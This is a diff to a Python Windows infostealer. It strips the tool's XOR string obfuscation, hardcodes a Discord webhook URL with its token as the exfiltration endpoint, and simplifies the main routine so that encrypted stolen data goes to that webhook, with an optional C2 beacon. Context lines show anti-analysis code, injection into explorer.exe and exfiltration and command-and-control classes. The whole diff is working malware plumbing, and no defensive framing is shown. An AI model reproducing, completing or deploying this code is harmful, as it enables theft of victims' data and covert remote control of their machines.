@@ -39,57 +39,10 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
 
-# === GLOBAL CONFIGURATION ===
-# All sensitive data is encrypted with system-derived key
-# No hardcoded strings in clear text
-
-class ObfuscatedStrings:
-    """All strings are XOR-obfuscated with a per-instance key"""
-    def __init__(self):
-        self.key = self._generate_key()
-    
-    def _generate_key(self):
-        # Key derived from system + random salt
-        salt = os.urandom(16)
-        system = self._get_system_fingerprint()
-        return hashlib.sha256(system + salt).digest()
-    
-    def _get_system_fingerprint(self):
-        try:
-            vol = subprocess.check_output("wmic volume get SerialNumber", shell=True, stderr=subprocess.DEVNULL, text=True).split()[1]
-        except:
-            vol = "UNKNOWN_VOL"
-        try:
-            cpu = subprocess.check_output("wmic cpu get ProcessorId", shell=True, stderr=subprocess.DEVNULL, text=True).split()[1]
-        except:
-            cpu = "UNKNOWN_CPU"
-        host = os.environ.get('COMPUTERNAME', 'UNKNOWN_HOST')
-        return f"{vol}|{cpu}|{host}".encode()
-    
-    def xor_obfuscate(self, plaintext):
-        """Obfuscate a string using XOR + base64"""
-        enc = bytes([ord(c) ^ self.key[i % len(self.key)] for i, c in enumerate(plaintext)])
-        return base64.b64encode(enc).decode()
-    
-    def xor_deobfuscate(self, encoded):
-        """Deobfuscate a string"""
-        enc = base64.b64decode(encoded)
-        return ''.join(chr(enc[i] ^ self.key[i % len(self.key)]) for i in range(len(enc)))
-
-# === OBFUSCATED DATA (generated at install time) ===
-# These are placeholders - actual script would have these generated
-class EncryptedConfig:
-    def __init__(self):
-        self.obf = ObfuscatedStrings()
-        # Webhook URLs encrypted with XOR
-        self.webhook_enc = "BASE64_ENCODED_XOR_WEBHOOK_HERE"
-        self.c2_enc_list = ["BASE64_ENCODED_XOR_C2_1", "BASE64_ENCODED_XOR_C2_2"]
-    
-    def get_webhook(self):
-        return self.obf.xor_deobfuscate(self.webhook_enc)
-    
-    def get_c2_list(self):
-        return [self.obf.xor_deobfuscate(enc) for enc in self.c2_enc_list]
+# === PLAIN CONFIGURATION (no obfuscation) ===
+class Config:
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"
+    C2_ENDPOINTS = []  # Leave empty if you only use the webhook
 
 # === ANTI-DEBUG / ANTI-ANALYSIS ===
 class AntiAnalysis:
@@ -624,11 +577,6 @@ class ProcessInjector:
             user32 = ctypes.WinDLL('user32', use_last_error=True)
             
             # Get process ID of explorer.exe
-            proc_ids = []
-            for proc in os.listdir('/proc'):  # Windows alternative
-                pass
-            
-            # Simplified injection for Windows
             pid = None
             output = subprocess.check_output("tasklist /FI \"IMAGENAME eq explorer.exe\" /FO CSV", shell=True, text=True)
             lines = output.strip().split('\n')
@@ -833,15 +781,15 @@ def main():
     # Prepare and exfiltrate
     encrypted = ExfiltrationManager.prepare_data(data)
     
-    # Send via webhook
-    config = EncryptedConfig()
-    webhook = config.get_webhook()
+    # Send via webhook (plain config)
+    webhook = Config.WEBHOOK_URL
     if webhook:
         ExfiltrationManager.exfiltrate(encrypted, webhook)
     
-    # Also try C2
-    c2_client = C2Client(config.get_c2_list())
-    c2_client.beacon()
+    # Also try C2 if any endpoints configured
+    if Config.C2_ENDPOINTS:
+        c2_client = C2Client(Config.C2_ENDPOINTS)
+        c2_client.beacon()
 
 # === ENTRY POINT ===
 if __name__ == "__main__":
